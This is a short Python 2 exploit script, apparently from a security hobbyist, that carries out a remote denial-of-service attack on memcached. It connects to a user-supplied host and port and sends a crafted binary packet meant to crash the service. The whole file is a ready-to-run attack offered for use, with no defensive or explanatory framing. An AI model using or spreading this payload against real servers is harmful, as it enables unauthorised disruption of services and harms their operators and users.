#!/usr/bin/python
# Author: infodox // @info_dox
# Site: insecurety.net
# Old bug, still unpatched. Patch nao?
import sys
import socket

print "Memcached Remote DoS - Bursting Clouds yo!"
if len(sys.argv) != 3:
    print "Usage: %s <host> <port>" %(sys.argv[0])
    sys.exit(1)

target = sys.argv[1]
port = sys.argv[2]

print "[+] Target Host: %s" %(target)
print "[+] Target Port: %s" %(port)

kill = """\x80\x12\x00\x01\x08\x00\x00\x00\xff\xff\xff"""
kill +="""\xe8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
kill +="""\x00\xff\xff\xff\xff\x01\x00\x00\0xabad1dea"""

hax = socket.socket ( socket.AF_INET, socket.SOCK_STREAM )
try:
    hax.connect((target, int(port)))
    print "[+] Connected, firing payload!"
except:
    print "[-] Connection Failed... Is there even a target?"
    sys.exit(1)
try:
    hax.send(kill)
    print "[+] Payload Sent!"
except:
    print "[-] Payload Sending Failure... WTF?"
    sys.exit(1)
hax.close()
print "[*] Should be dead..."